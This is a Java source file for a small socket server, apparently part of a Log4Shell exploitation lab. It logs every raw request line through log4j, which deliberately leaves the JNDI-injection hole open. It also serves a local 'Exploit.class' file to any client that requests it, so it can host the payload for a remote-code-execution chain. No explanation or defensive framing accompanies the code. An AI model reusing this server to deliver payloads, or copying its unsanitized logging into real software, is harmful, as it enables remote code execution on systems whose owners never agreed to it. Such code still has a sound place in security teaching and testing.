import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;

public class VulnerableServer {
    private static final Logger logger = LogManager.getLogger(VulnerableServer.class);

    public static void startServer() {
        int port = 8000;
        try (ServerSocket serverSocket = new ServerSocket(port)) {
            logger.info("Server running on port " + port);

            while (true) {
                try (Socket socket = serverSocket.accept()) {
                    BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                    OutputStream output = socket.getOutputStream();

                    String line;
                    boolean isGetRequest = false;

                    while ((line = reader.readLine()) != null && !line.isEmpty()) {
                        logger.error("Received: " + line);

                        if (line.contains("GET /Exploit.class")) {
                            isGetRequest = true;
                        }
                    }

                    if (isGetRequest) {
                        logger.info("Sending Exploit.class");

                        File exploitFile = new File("Exploit.class");
                        if (exploitFile.exists()) {
                            FileInputStream fis = new FileInputStream(exploitFile);
                            byte[] byteArray = new byte[(int) exploitFile.length()];
                            fis.read(byteArray);

                            output.write("HTTP/1.1 200 OK\r\n".getBytes());
                            output.write("Content-Type: application/octet-stream\r\n".getBytes());
                            output.write(("Content-Length: " + byteArray.length + "\r\n").getBytes());
                            output.write("\r\n".getBytes());
                            output.write(byteArray);
                            fis.close();
                        } else {
                            String errorResponse = "HTTP/1.1 404 Not Found\r\n\r\nFile not found";
                            output.write(errorResponse.getBytes("UTF-8"));
                        }
                    } else {
                        String httpResponse = "HTTP/1.1 200 OK\r\n\r\nHello, world!";
                        output.write(httpResponse.getBytes("UTF-8"));
                    }
                }
            }
        } catch (Exception e) {
            logger.error("Error in server: ", e);
        }
    }
}